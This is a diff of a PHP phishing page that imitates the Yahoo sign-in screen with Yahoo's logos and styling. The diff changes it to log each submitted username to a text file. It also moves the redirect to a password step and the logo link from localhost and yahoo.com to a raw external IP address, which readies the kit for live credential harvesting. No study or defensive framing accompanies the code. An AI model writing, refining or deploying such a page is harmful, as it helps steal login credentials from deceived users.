@@ -2,11 +2,12 @@
 if(isset($_POST['submit'])) 
 { 
 $name = $_POST['username'];
-$myfile = fopen("./data.txt", "w");
+$myfile = fopen("./data.txt", "a");
 $name = $_POST['username'];
-fwrite($myfile, $name);
+$parsed = $name."\n";
+fwrite($myfile, $parsed);
 fclose($myfile);
-header("Location: http://localhost/password?username=".$name);
+header("Location: http://35.178.199.24/password?username=".$name);
 }
 ?>
 <!DOCTYPE html>
@@ -21,7 +22,7 @@ header("Location: http://localhost/password?username=".$name);
 
 <body class="orko en-us ">
     <div class="row login-header">
-        <span class="column"><a href="https://www.yahoo.com/" title="Yahoo"><img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" width="" height="36" />
+        <span class="column"><a href="http://35.178.199.24/" title="Yahoo"><img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" width="" height="36" />
 <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo" width="" height="36" /></a></span>
     </div>
     <div class="login-body">
